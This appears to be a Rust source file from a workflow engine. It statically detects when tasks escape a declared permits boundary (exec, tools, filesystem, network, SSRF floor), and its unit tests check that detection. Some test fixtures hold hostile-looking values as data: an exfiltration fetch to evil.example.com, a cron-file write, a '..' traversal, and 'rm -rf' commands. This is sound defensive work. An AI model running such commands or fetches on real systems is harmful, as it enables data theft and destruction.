// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Capability-escape detection — does the body FIT the declared `permits:`?
//!
//! Per spec `01-envelope.md` §permits · once `permits:` is present every
//! category is default-deny. This scan flags the **statically-detectable**
//! escapes (`nika check` surface · the runtime `NIKA-SEC-004` catches the
//! dynamic remainder) ·
//!
//! - an `exec:` task under a `false`/omitted permit; an argv `command[0]`
//!   outside the program allowlist; or ANY shell-string command under a
//!   program allowlist (a pipeline can launch any program — runtime parity)
//! - an `invoke:`/`agent` tool outside `permits.tools`
//! - a builtin whose **literal** effect escapes the declared `fs`/`net`
//!   boundary — a `nika:fetch` to an unlisted host (`permits.net.http`),
//!   a `nika:read`/`nika:write` to a path outside `permits.fs.{read,write}`.
//!   These are exactly the two escapes spec `01-envelope.md` §permits names
//!   first (`nika:write ./etc/x outside fs.write` · `nika:fetch` to an
//!   unlisted host). A path/host built from a `${{ }}` value is dynamic and
//!   stays the runtime `NIKA-SEC-004` check.

use nika_schema::raw::{RawAction, RawCommand, RawInvokeAction, RawWorkflow};
use nika_schema::types::{ExecPermit, Permits};
// The `*.`-subdomain allowlist glob lives in `nika_types::net` — the SINGLE
// canonical matcher shared with the runtime http effect (`nika-http`) so the
// check-time and run-time verdicts can't drift. The host EXTRACTION is the
// `url` crate (below) on BOTH sides — a string parser disagrees with WHATWG
// normalization (`\`/userinfo/case) and that gap is a boundary bypass.

/// A statically-detectable effect outside the declared boundary.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct CapabilityEscape {
    /// The offending task.
    pub task: String,
    /// The capability category (`exec`, `tools`).
    pub category: &'static str,
    /// Human detail (the specific tool/program that escaped).
    pub detail: String,
    /// The machine-applicable repair, ALWAYS the one idiom
    /// `add "<entry>" to permits.<category-path>` — where « add to »
    /// means: ensure the list at that path exists (creating the block,
    /// or replacing a denying `exec: false` scalar with a list) and
    /// contains the entry. One idiom = the agent repair loop
    /// pattern-matches once and converges (e2e-tested).
    pub fix: Option<String>,
    /// True when the escape is the always-on SSRF floor (`NIKA-SEC-005` ·
    /// spec 05-errors: independent of `permits:`), not the declared
    /// boundary (`NIKA-SEC-004`). A floor escape never carries a grant
    /// `fix` — no permits entry can admit the target; the repair is
    /// pointing the task at a public host. Additive (`#[non_exhaustive]`).
    pub floor: bool,
}

/// Scan a workflow for capability escapes. The declared-boundary checks
/// run only under a `permits:` block (absent = today's behavior, nothing
/// to enforce); the SSRF-floor parity check runs UNCONDITIONALLY — the
/// floor itself is independent of `permits:` (spec 05-errors
/// `NIKA-SEC-005`), so a literal fetch to a floor-blocked target is a
/// check-time truth with or without a boundary. Walks every task's main
/// action AND its `on_finally:` cleanup actions — a cleanup runs under
/// the same boundary (and ALWAYS runs, so a blind spot there breaks
/// every run, not just the failure path).
#[must_use]
pub fn scan_escapes(wf: &RawWorkflow) -> Vec<CapabilityEscape> {
    let permits = wf.permits.as_ref().map(|p| &p.value);
    let mut escapes = Vec::new();
    for task in &wf.tasks {
        let id = &task.value.id.value;
        check_action(id, &task.value.action, permits, &mut escapes);
        for cleanup in &task.value.on_finally {
            check_action(
                &format!("{id} (on_finally)"),
                &cleanup.value.action,
                permits,
                &mut escapes,
            );
        }
    }
    // Dead grants: a literal `permits.net.http` entry the floor always
    // refuses can never take effect — the runtime blocks the target
    // before the allowlist is even consulted. Flagged at the ENTRY (its
    // own yaml site) so the author learns the grant is inert even when
    // every task URL is dynamic. Globs are skipped: `*.internal.example`
    // may match public names, and glob-vs-floor inclusion is DNS
    // knowledge the static pass does not have. An EXACT loopback literal
    // is skipped too (#395): it now TAKES effect — the author's explicit
    // declassification clears the floor for that host — so it is no
    // longer dead; the affirmative statement rides `EffectivePermits::
    // notes`. RFC1918/link-local/metadata entries stay dead-flagged.
    if let Some(net) = permits.and_then(|p| p.net.as_ref()) {
        for entry in &net.http {
            if !entry.contains('*')
                && nika_types::net::host_is_blocked(entry)
                && !nika_types::net::is_exact_loopback_literal(entry)
            {
                escapes.push(CapabilityEscape {
                    task: "permits".to_owned(),
                    category: "net",
                    detail: format!(
                        "permits.net.http entry `{entry}` can never take effect — the \
                         always-on SSRF floor (NIKA-SEC-005) refuses loopback/private/\
                         link-local/metadata targets regardless of `permits:`; remove \
                         the entry"
                    ),
                    fix: None,
                    floor: true,
                });
            }
        }
    }
    escapes
}

/// The declared `permits.net.http` entries — empty when no `permits:`
/// block (or no `net:`) is declared. The slice the floor-parity pass
/// feeds [`nika_types::net::loopback_declassified`], mirroring what the
/// runtime hands `nika-http` (`NetBoundary::globs`).
fn net_http(permits: Option<&Permits>) -> &[String] {
    permits
        .and_then(|p| p.net.as_ref())
        .map_or(&[], |n| &n.http)
}

/// Check one action (a task's main verb OR an `on_finally` cleanup verb)
/// against the boundary. The floor half runs even with no `permits:`
/// declared; the boundary half needs one.
fn check_action(
    id: &str,
    action: &RawAction,
    permits: Option<&Permits>,
    out: &mut Vec<CapabilityEscape>,
) {
    if let RawAction::Invoke(a) = action {
        check_net_floor(id, a, permits, out);
    }
    let Some(permits) = permits else { return };
    match action {
        RawAction::Exec(a) => check_exec(id, &a.command, permits, out),
        RawAction::Invoke(a) => {
            let Some(tool) = a.tool() else {
                // A `workflow:` call is not a tool grant — its authority
                // law is containment (child ⊆ parent ∩ declared), owned
                // by the composition lane (NIKA-COMP-002 · spec 14 law 3/4).
                return;
            };
            if permits.allows_tool(&tool.value) {
                // Tool is granted — but it may still reach a host/path
                // outside the fs/net boundary. Check the literal effect.
                // (A tool OUTSIDE permits.tools is already flagged below;
                // re-flagging its effect would double-count.)
                check_builtin_effect(id, a, permits, out);
            } else {
                escapes_tool(id, "invoke", &tool.value, out);
            }
        }
        RawAction::Agent(a) => {
            for tool in &a.tools {
                if !permits.allows_tool(&tool.value) {
                    escapes_tool(id, "agent", &tool.value, out);
                }
            }
        }
        RawAction::Infer(_) => {}
        #[allow(
            clippy::unreachable,
            reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
        )]
        other => unreachable!("unknown action: {other:?}"),
    }
}

/// The check≡run SSRF-floor parity pass (battery finding F3 · issue #395):
/// a literal net-egress URL whose host the always-on floor refuses can
/// NEVER succeed at run — `check` blessing it was a false green. Fires on
/// the same static knowledge the runtime's static layer has (the
/// `localhost` family · metadata names · literal-IP ranges, via the ONE
/// `nika_types::net::host_is_blocked` oracle `nika-http` enforces with);
/// a public DNS name that resolves privately stays the runtime
/// `GuardedResolver`'s half. No grant `fix` — permits cannot override the
/// floor, so the repair is the URL itself. The ONE carve-out (#395 ·
/// same-PR as the runtime's): an EXACT loopback literal in the declared
/// `permits.net.http` declassifies the floor for that host — the shared
/// `loopback_declassified` predicate `nika-http` enforces with, so the
/// escape stops firing exactly where the run stops refusing.
fn check_net_floor(
    id: &str,
    a: &RawInvokeAction,
    permits: Option<&Permits>,
    out: &mut Vec<CapabilityEscape>,
) {
    let Some(BuiltinEffect::Net { url_arg }) = builtin_effect(a) else {
        return;
    };
    let Some(tool_ref) = a.tool() else {
        return; // builtin_effect is None for workflow: — unreachable belt
    };
    if let Some(host) = literal_arg(a, url_arg).as_deref().and_then(url_host)
        && nika_types::net::host_is_blocked(&host)
        && !nika_types::net::loopback_declassified(net_http(permits), &host)
    {
        let tool = tool_ref.value.as_str();
        out.push(CapabilityEscape {
            task: id.to_owned(),
            category: "net",
            detail: format!(
                "`{tool}` host `{host}` is refused by the always-on SSRF floor \
                 (NIKA-SEC-005): loopback/private/link-local/metadata targets are \
                 unreachable regardless of `permits:` — point the task at a \
                 public host"
            ),
            fix: None,
            floor: true,
        });
    }
}

/// Record a tool-surface escape (`invoke`/`agent` tool outside the grant).
///
/// When the tool is a `nika:`-prefixed name that is NOT a canonical
/// builtin, the grant fix is withheld — the rename (the `unknown_tools`
/// finding's did-you-mean) owns the repair; recommending a grant for a
/// tool that does not exist would steer the agent loop into a phantom
/// permits entry.
fn escapes_tool(id: &str, surface: &str, tool: &str, out: &mut Vec<CapabilityEscape>) {
    let is_phantom_builtin = tool
        .strip_prefix("nika:")
        .is_some_and(|name| !nika_catalog::all_builtins().iter().any(|b| b.name == name));
    out.push(CapabilityEscape {
        task: id.to_owned(),
        category: "tools",
        detail: format!("{surface} tool `{tool}` is outside permits.tools"),
        fix: (!is_phantom_builtin).then(|| format!("add \"{tool}\" to permits.tools")),
        floor: false,
    });
}

/// An `exec:` task under a `permits:` boundary. A `false`/omitted permit
/// denies any exec; a program allowlist verifies `argv[0]` of the ARRAY
/// form only — the shell-string form under an allowlist is an escape by
/// FORM (runtime parity: dispatch refuses that pairing wholesale).
fn check_exec(id: &str, command: &RawCommand, permits: &Permits, out: &mut Vec<CapabilityEscape>) {
    if !permits.allows_exec() {
        out.push(CapabilityEscape {
            task: id.to_owned(),
            category: "exec",
            detail: "exec task under a boundary that forbids shells".to_owned(),
            // same `add … to …` idiom as every other fix — applied to a
            // denying `exec: false`, « add » means replace it with the list.
            // ARGV form only: a program allowlist never verifies a shell
            // string (the runtime refuses that pairing), so suggesting one
            // for a Shell command would write a self-refusing boundary.
            fix: match command {
                RawCommand::Argv(_) => {
                    static_program(command).map(|p| format!("add \"{p}\" to permits.exec"))
                }
                RawCommand::Shell(_) => None,
            #[allow(
                clippy::unreachable,
                reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
            )]
            other => unreachable!("unknown exec command form: {other:?}"),
            },
            floor: false,
        });
        return;
    }
    if let Some(ExecPermit::Programs(_)) = permits.exec.as_ref() {
        // Runtime parity: a program allowlist verifies argv[0] — and ONLY
        // argv[0]. The dispatch refuses the shell-string form under an
        // allowlist wholesale (a pipeline can launch any program), so the
        // pairing is an escape by FORM, before any leading-token look —
        // statically detectable, so check-time (spec 01 §permits rule 8).
        if matches!(command, RawCommand::Shell(_)) {
            out.push(CapabilityEscape {
                task: id.to_owned(),
                category: "exec",
                detail: "a shell-string command cannot be verified against a \
                         `permits.exec` program allowlist (a pipeline can \
                         launch any program) — use the array form"
                    .to_owned(),
                // No machine fix: widening the permit would not make the
                // string form verifiable; the fix is rewriting the command.
                fix: None,
                floor: false,
            });
            return;
        }
        if let Some(program) = static_program(command)
            && !permits.allows_program(program)
        {
            out.push(CapabilityEscape {
                task: id.to_owned(),
                category: "exec",
                detail: format!("program `{program}` is outside permits.exec allowlist"),
                fix: Some(format!("add \"{program}\" to permits.exec")),
                floor: false,
            });
        }
    }
}

/// The fine-grained effect table lives in `nika-cap` beside the coarse
/// policy projection (W4 · one home for both tables — the same 15k
/// extraction pressure as shape.rs 2026-07-07); this seam re-exports it
/// so every consumer (escape scan · inference · declass) keeps ONE
/// import site.
pub(super) use nika_cap::BuiltinEffect;

/// Classify a builtin invoke's statically-checkable effect — the
/// `RawInvokeAction` adapter over [`nika_cap::builtin_effect`].
pub(super) fn builtin_effect(a: &RawInvokeAction) -> Option<BuiltinEffect> {
    let tool = a.tool()?;
    nika_cap::builtin_effect(&tool.value, a.args.as_ref().map(|s| &s.value))
}

/// The `nika:chart` `compile_to: vega_lite` second gated file — the
/// `RawInvokeAction` adapter over [`nika_cap::chart_vl_sibling`].
pub(super) fn chart_vl_sibling(a: &RawInvokeAction) -> Option<String> {
    let tool = a.tool()?;
    nika_cap::chart_vl_sibling(&tool.value, a.args.as_ref().map(|s| &s.value))
}

/// Check a builtin invoke's LITERAL fs/net effect against the boundary,
/// per the [`builtin_effect`] classification. A `${{ }}`-built arg is
/// dynamic → the runtime `NIKA-SEC-004` check.
fn check_builtin_effect(
    id: &str,
    a: &RawInvokeAction,
    permits: &Permits,
    out: &mut Vec<CapabilityEscape>,
) {
    let Some(tool_ref) = a.tool() else {
        return; // a workflow: call is the composition lane's (COMP-002)
    };
    let tool = tool_ref.value.as_str();
    match builtin_effect(a) {
        Some(BuiltinEffect::Net { url_arg }) => {
            // A floor-blocked host never gets a boundary escape: either it
            // is already flagged by `check_net_floor` (and the grant fix
            // would be a lie — no ordinary entry can admit it), or it is
            // DECLASSIFIED by an exact loopback literal (#395) — and that
            // same entry admits the host at the runtime boundary too
            // (`check_net_allowlist`), so there is nothing to escape.
            if let Some(host) = literal_arg(a, url_arg).as_deref().and_then(url_host)
                && !nika_types::net::host_is_blocked(&host)
                && !permits.allows_host(&host)
            {
                out.push(CapabilityEscape {
                    task: id.to_owned(),
                    category: "net",
                    detail: format!("`{tool}` host `{host}` is outside permits.net.http"),
                    fix: Some(format!("add \"{host}\" to permits.net.http")),
                    floor: false,
                });
            }
        }
        Some(BuiltinEffect::Fs {
            path_arg,
            reads,
            writes,
            ..
        }) => {
            let Some(path) = literal_arg(a, path_arg) else {
                return;
            };
            for (active, dir_writes, cat) in [(reads, false, "fs.read"), (writes, true, "fs.write")]
            {
                if active && !permits.allows_path(&path, dir_writes) {
                    out.push(CapabilityEscape {
                        task: id.to_owned(),
                        category: "fs",
                        detail: format!("`{tool}` path `{path}` is outside permits.{cat}"),
                        fix: Some(format!("add \"{path}\" to permits.{cat}")),
                        floor: false,
                    });
                }
            }
            // The chart vega sibling is a SECOND gated write — same
            // boundary test as the artifact itself.
            if let Some(vl) = chart_vl_sibling(a)
                && !permits.allows_path(&vl, true)
            {
                out.push(CapabilityEscape {
                    task: id.to_owned(),
                    category: "fs",
                    detail: format!("`{tool}` vega sibling `{vl}` is outside permits.fs.write"),
                    fix: Some(format!("add \"{vl}\" to permits.fs.write")),
                    floor: false,
                });
            }
        }
        None => {}
    }
}

/// A literal string value of `args.<key>` — `None` when the arg is absent,
/// non-string, or carries a `${{ }}` interpolation (dynamic → runtime).
pub(super) fn literal_arg(a: &RawInvokeAction, key: &str) -> Option<String> {
    let s = a.args.as_ref()?.value.get(key)?.as_str()?;
    if s.contains("${{") {
        return None; // dynamic value · runtime concern
    }
    Some(s.to_owned())
}

/// The host of a literal URL (`https://api.x.com/p` → `api.x.com`), via the
/// `url` crate — the SAME WHATWG normalization the runtime http effect
/// connects with (`nika-http`). A hand-rolled string parser disagrees on
/// `\` (a path separator for http/https), userinfo (`a@b`), case, and C0
/// bytes; that disagreement is a boundary bypass, so check + runtime MUST
/// share the parser. Bracket-free for IPv6 (permits write `::1`, matching
/// `nika_types::net`). `None` when there is no parseable host (a relative /
/// garbage value → not a static-permits concern).
pub(super) fn url_host(raw: &str) -> Option<String> {
    match url::Url::parse(raw).ok()?.host()? {
        // Strip the absolute-FQDN trailing dot (`allowed.com.` ≡ `allowed.com`)
        // — the runtime extractor (`nika-http`) + the SSRF layer do the same,
        // so check and runtime agree.
        url::Host::Domain(d) => Some(d.trim_end_matches('.').to_owned()),
        url::Host::Ipv4(a) => Some(a.to_string()),
        url::Host::Ipv6(a) => Some(a.to_string()),
    }
}

/// The statically-known program of an ARRAY-form command: `argv[0]` when it
/// is a literal (argv is execve-direct — no shell expansion — so only a
/// `${{ }}` island makes it dynamic). `None` for the shell-string form,
/// which has no single static program to check against an allowlist — a
/// pipeline can launch any program, so `check_exec` refuses it by FORM
/// before ever asking for its program.
pub(super) fn static_program(command: &RawCommand) -> Option<&str> {
    match command {
        RawCommand::Argv(_) => command.argv_program().filter(|p| !p.contains("${{")),
        RawCommand::Shell(_) => None,
        #[allow(
            clippy::unreachable,
            reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
        )]
        other => unreachable!("unknown exec command form: {other:?}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes_of(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn url_host_matches_the_shared_parity_vectors() {
        // The static extractor (`url_host`) MUST agree with the runtime
        // (`nika-http`'s `host_of`) on every shared vector — the no-drift
        // guarantee. nika-http asserts the SAME table against its extractor;
        // if either drifts on `\@`/userinfo/case/IPv6/trailing-dot, one of
        // the two suites fails. This is the static HALF of the parity the
        // whole `permits.net.http` fix rests on.
        for (input, expected) in nika_types::net::HOST_EXTRACTION_VECTORS {
            assert_eq!(
                url_host(input).as_deref(),
                *expected,
                "url_host disagrees on {input}"
            );
        }
    }

    /// The two newest media builtins were INVISIBLE to the effect
    /// classification: a chart/tts write outside the boundary passed the
    /// static scan and failed at runtime, and --infer-permits wrote a
    /// boundary the run then refused (the self-refusing class). Both
    /// sides pin here — the sibling `.vl.json` included.
    #[test]
    fn chart_and_tts_writes_escape_an_empty_boundary() {
        let escapes = escapes_of(
            "\
nika: v1
workflow:
  id: t
model: mock/echo
permits:
  fs: { write: [\"elsewhere/**\"] }
  tools: [\"nika:chart\", \"nika:tts_generate\"]
tasks:
  c:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/c.svg\"
        compile_to: vega_lite
  s:
    invoke:
      tool: \"nika:tts_generate\"
      args:
        text: \"hi\"
        output_dir: \"audio\"
",
        );
        let fs: Vec<&str> = escapes
            .iter()
            .filter(|e| e.category == "fs")
            .map(|e| e.detail.as_str())
            .collect();
        assert!(
            fs.iter().any(|d| d.contains("out/c.svg")),
            "chart artifact write must escape: {fs:?}"
        );
        assert!(
            fs.iter().any(|d| d.contains("out/c.vl.json")),
            "chart vega sibling write must escape: {fs:?}"
        );
        assert!(
            fs.iter().any(|d| d.contains("audio")),
            "tts output_dir write must escape: {fs:?}"
        );
    }

    #[test]
    fn chart_vl_sibling_derives_only_for_literal_vega_lite() {
        let wf = parse(
            "\
nika: v1
workflow:
  id: t
model: mock/echo
tasks:
  c:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/c.svg\"
        compile_to: vega_lite
  plain:
    invoke:
      tool: \"nika:chart\"
      args:
        data: [{ x: \"a\", y: 1 }]
        chart: { type: bar, x: x, y: y }
        out: \"out/p.svg\"
",
            FileId::new(0),
            ParseMode::Strict,
        )
        .expect("parse");
        let invoke_of = |id: &str| match &wf
            .tasks
            .iter()
            .find(|t| t.value.id.value == id)
            .expect("task")
            .value
            .action
        {
            nika_schema::raw::RawAction::Invoke(a) => a,
            other => panic!("not an invoke: {other:?}"),
        };
        assert_eq!(
            chart_vl_sibling(invoke_of("c")).as_deref(),
            Some("out/c.vl.json"),
        );
        assert_eq!(chart_vl_sibling(invoke_of("plain")), None);
    }

    #[test]
    fn no_permits_block_no_escapes() {
        let y = "nika: v1\nworkflow:\n  id: w\ntasks:\n  t:\n    exec: { shell: \"rm -rf /\" }\n";
        assert!(
            escapes_of(y).is_empty(),
            "absent permits = nothing to enforce"
        );
    }

    #[test]
    fn exec_under_false_permit_escapes() {
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { exec: false }\ntasks:\n  t:\n    exec: { shell: \"echo hi\" }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].category, "exec");
    }

    #[test]
    fn exec_outside_program_allowlist_escapes() {
        // Argv form — the ONLY form an allowlist verifies (a shell string
        // under an allowlist escapes by FORM · see the by-form tests).
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { exec: [\"git\", \"cargo\"] }\ntasks:\n  ok:\n    exec: { command: [\"git\", \"status\"] }\n  bad:\n    exec: { command: [\"rm\", \"-rf\", \"x\"] }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "git allowed, rm escapes");
        assert_eq!(e[0].task, "bad");
        assert!(e[0].detail.contains("rm"));
    }

    #[test]
    fn dynamic_argv_head_is_a_runtime_concern_not_a_static_escape() {
        // `["${{ vars.bin }}", "x"]` — the program is template-built. The
        // static check must NOT compare the raw `${{ }}` island against the
        // allowlist (that was a false positive); runtime NIKA-SEC-004 owns it.
        let y = "nika: v1\nworkflow:\n  id: w\nconst: { bin: \"git\" }\npermits: { exec: [\"git\"] }\ntasks:\n  t:\n    exec: { command: [\"${{ const.bin }}\", \"status\"] }\n";
        assert!(
            escapes_of(y).is_empty(),
            "dynamic argv[0] is not statically checkable"
        );
    }

    #[test]
    fn escape_fixes_are_machine_applicable() {
        // a REAL tool outside the grant → the fix is the grant line;
        // a PHANTOM builtin (typo) → fix withheld (the rename owns it).
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:read\"], exec: false }\ntasks:\n  real:\n    invoke: { tool: \"nika:write\", args: { path: \"x\", content: \"y\" } }\n  typo:\n    invoke: { tool: \"nika:wrte\", args: { path: \"x\", content: \"y\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 2);
        assert_eq!(
            e[0].fix.as_deref(),
            Some("add \"nika:write\" to permits.tools")
        );
        assert_eq!(e[1].fix, None, "phantom builtin → rename owns the repair");
    }

    #[test]
    fn on_finally_cleanup_outside_boundary_escapes() {
        // A cleanup verb runs under the same boundary — and ALWAYS runs.
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { exec: [\"cargo\"] }\ntasks:\n  build:\n    exec: { command: [\"cargo\", \"build\"] }\n    on_finally:\n      - invoke: { tool: \"nika:write\", args: { path: \"./log\", content: \"x\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "the cleanup's tool grant is missing");
        assert_eq!(e[0].task, "build (on_finally)");
        assert_eq!(e[0].category, "tools");
    }

    #[test]
    fn edit_requires_both_fs_directions() {
        // in-place find/replace reads the bytes, then rewrites the path —
        // a write-only grant leaves the read side escaping.
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:edit\"], fs: { write: [\"./README.md\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:edit\", args: { path: \"./README.md\", find: \"a\", replace: \"b\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert!(e[0].detail.contains("fs.read"), "detail: {}", e[0].detail);
    }

    #[test]
    fn ipv6_bracket_host_is_extracted_not_mangled() {
        // `https://[::1]:8080/x` — the host is `::1`, not `[` (the first-`:`
        // split bug). Bracket-free in permits, symmetric both sides. Since
        // the declassification (#395), a granted `::1` is the author's
        // explicit act: check is GREEN (and the run reaches the host).
        let granted = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:fetch\"], net: { http: [\"::1\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://[::1]:8080/x\" } }\n";
        assert!(
            escapes_of(granted).is_empty(),
            "the exact `::1` literal declassifies its host"
        );
        // UNGRANTED, the floor holds — and the extraction still reads the
        // bare `::1` in the escape detail (the bug this test pins).
        let ungranted = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:fetch\"], net: { http: [\"api.x.com\"] }, exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:fetch\", args: { url: \"https://[::1]:8080/x\" } }\n";
        let e = escapes_of(ungranted);
        assert_eq!(e.len(), 1, "floor escape only — never the grant fix");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`::1`"), "detail: {}", e[0].detail);
    }

    #[test]
    fn webhook_notify_target_is_checked_as_net() {
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"webhook\", target: \"https://hooks.x.com/p\", message: \"hi\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "webhook target host needs a net grant");
        assert_eq!(e[0].category, "net");
        // a non-webhook channel rides an engine transport — no host check
        let email = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"email\", target: \"ops@x.com\", message: \"hi\" } }\n";
        assert!(escapes_of(email).is_empty());
    }

    #[test]
    fn invoke_outside_tools_escapes() {
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:read\"] }\ntasks:\n  t:\n    invoke: { tool: \"nika:write\", args: { path: \"x\", content: \"y\" } }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].category, "tools");
        assert!(e[0].detail.contains("nika:write"));
    }

    #[test]
    fn invoke_inside_tools_glob_is_clean() {
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"mcp:browser/*\"] }\ntasks:\n  t:\n    invoke: { tool: \"mcp:browser/navigate\", args: { url: \"x\" } }\n";
        assert!(escapes_of(y).is_empty());
    }

    #[test]
    fn agent_tool_outside_permits_escapes() {
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:fetch\"] }\ntasks:\n  t:\n    agent:\n      prompt: \"go\"\n      tools: [\"nika:fetch\", \"nika:write\"]\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "fetch allowed, write escapes");
        assert!(e[0].detail.contains("nika:write"));
    }

    #[test]
    fn every_shell_string_under_an_allowlist_escapes_by_form() {
        // Runtime parity: under a Programs allowlist the dispatch refuses
        // the shell-string form WHOLESALE (leading token irrelevant — a
        // pipeline can launch any program). Both tasks escape, the one
        // whose head is allowlisted (`GIT_PAGER=cat git …`) included.
        let y = r#"nika: v1
workflow:
  id: w
permits: { exec: ["git"] }
tasks:
  head_allowed:
    exec: { shell: "GIT_PAGER=cat git log" }
  head_denied:
    exec: { shell: "FOO=1 rm -rf x" }
"#;
        let e = escapes_of(y);
        assert_eq!(e.len(), 2, "the string FORM escapes, not the head");
        assert!(
            e.iter().all(|esc| esc.detail.contains("array form")),
            "both route to the array form"
        );
    }

    #[test]
    fn dynamic_shell_head_under_allowlist_is_flagged_by_form_first() {
        // Before this rule the dynamic head was waved through as « a
        // runtime concern » — but the runtime refuses the string form
        // under an allowlist before it ever looks at the head.
        let y = "nika: v1\nworkflow:\n  id: w\npermits: { exec: [\"git\"] }\nconst: { cmd: \"git\" }\ntasks:\n  t:\n    exec: { shell: \"${{ const.cmd }} status\" }\n";
        let e = escapes_of(y);
        assert_eq!(e.len(), 1, "string form under an allowlist escapes");
    }

    #[test]
    fn non_webhook_notify_with_url_target_is_not_a_net_sink() {
        // notify is a net egress ONLY on the `webhook` channel. An `email`
        // channel whose `target` happens to parse as a URL must NOT be
        // classified as a net effect — kills the channel-guard→true mutant
        // (which would flag every notify target as a host escape). The
        // existing webhook-positive case kills the guard→false direction.
        let email = "nika: v1\nworkflow:\n  id: w\npermits: { tools: [\"nika:notify\"], exec: false }\ntasks:\n  t:\n    invoke: { tool: \"nika:notify\", args: { channel: \"email\", target: \"https://hooks.evil.com/p\", message: \"hi\" } }\n";
        assert!(
            escapes_of(email).is_empty(),
            "a non-webhook channel's URL-shaped target is not a net sink"
        );
    }
}

#[cfg(test)]
mod fs_net_regression {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn fetch_to_unlisted_host_escapes() {
        // The spec's own first named example: a nika:fetch to an unlisted host.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["api.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://evil.example.com/exfil" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "evil host escapes net.http");
        assert_eq!(e[0].category, "net");
        assert!(e[0].detail.contains("evil.example.com"));
    }

    #[test]
    fn fetch_to_listed_host_is_clean() {
        let y = r#"nika: v1
workflow:
  id: w
permits:
  net: { http: ["*.anthropic.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.anthropic.com/v1/x" } }
"#;
        assert!(escapes(y).is_empty(), "glob host match is clean");
    }

    #[test]
    fn write_outside_fs_write_escapes() {
        // The spec's other named example: nika:write ./etc/x outside fs.write.
        let y = r#"nika: v1
workflow:
  id: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "/etc/cron.d/x", content: "pwn" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "etc path escapes fs.write");
        assert_eq!(e[0].category, "fs");
        assert!(e[0].detail.contains("/etc/cron.d/x"));
    }

    #[test]
    fn write_inside_fs_write_glob_is_clean() {
        let y = r#"nika: v1
workflow:
  id: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "./out/report.md", content: "x" } }
"#;
        assert!(escapes(y).is_empty(), "./out/** matches ./out/report.md");
    }

    #[test]
    fn dotdot_traversal_out_of_fs_write_is_flagged() {
        // The static half of the permits-bypass fix: a `..` that climbs out
        // of the boundary must NOT string-match the literal prefix. The path
        // lexically normalizes to `./escape.txt`, which is not under
        // `./out/` → flagged (the runtime canonicalize-then-confine is the
        // other half · catches symlinks + dynamic paths a static pass can't).
        let y = r#"nika: v1
workflow:
  id: w
permits:
  fs: { write: ["./out/**"] }
  tools: ["nika:write"]
tasks:
  t:
    invoke: { tool: "nika:write", args: { path: "./out/../escape.txt", content: "pwn" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "the `..` traversal escapes fs.write");
        assert_eq!(e[0].category, "fs");
        // …while a `..` that stays INSIDE the boundary is still clean.
        let clean = r#"nika: v1
workflow:
  id: w
permits:
  fs: { read: ["./out/**"] }
  tools: ["nika:read"]
tasks:
  t:
    invoke: { tool: "nika:read", args: { path: "./out/sub/../keep.txt" } }
"#;
        assert!(
            escapes(clean).is_empty(),
            "a `..` that stays inside the boundary is clean"
        );
    }

    #[test]
